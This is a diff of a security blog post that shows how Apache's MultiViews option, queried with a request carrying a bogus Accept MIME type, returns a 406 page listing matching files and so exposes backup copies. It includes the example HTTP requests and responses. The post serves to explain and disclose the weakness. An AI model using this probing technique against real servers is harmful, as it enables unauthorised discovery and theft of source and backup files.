@@ -134,23 +134,18 @@ This is a small post about a way to easily get backup files on Apache web server
  Accept-Language
  Accept-Encoding
 
-**
  Let's see how it works:
 
  Let's suppose i just saved an backup copy of my index.php on a Web Server with the MultiView option enabled.
 
  If an attacker requests "index" without any extension:
- **
 
 >
  GET /index HTTP/1.1
  Host: myhost
  Accept: */*
 
-**
-
  the web server will reply with:
- **
 
 >
  HTTP/1.1 200 OK
@@ -165,30 +160,23 @@ This is a small post about a way to easily get backup files on Apache web server
  Content-Length: #ofBytes
  Content-Type: text/html; charset=UTF-8
 
-**
-
  Now, it could be noticed that in the server response several interesting headers are out:
- **
 
 >
  Content-Location: index.php
  Vary: negotiate,accept
  TCN: choice
 
-**
  This means there is MultiViews enabled on / directory.
 
  Let's see if in the request we use a "Accept:" header with an inexistent mime type:
- **
 
 >
  GET /index HTTP/1.1
  Host: myhost
  Accept: application/whatever; q=1.0
 
-**
  the server will reply with:
- **
 
 >
  HTTP/1.1 406 Not Acceptable
@@ -215,8 +203,6 @@ This is a small post about a way to easily get backup files on Apache web server
  </ul>
  <hr>
 
-**
-
  aha! With a single request we get a listing of all the files!
  And for free..as in free speech ;)
 
@@ -241,7 +227,7 @@ This is a small post about a way to easily get backup files on Apache web server
 
 # Wisec is brought to you by...
 
-Wisec is written and mantained by [ Stefano Di Paola]().
+Wisec is written and mantained by  Stefano Di Paola.
 
 Wisec uses open standards, including XHTML, CSS2, and XML-RPC.
 
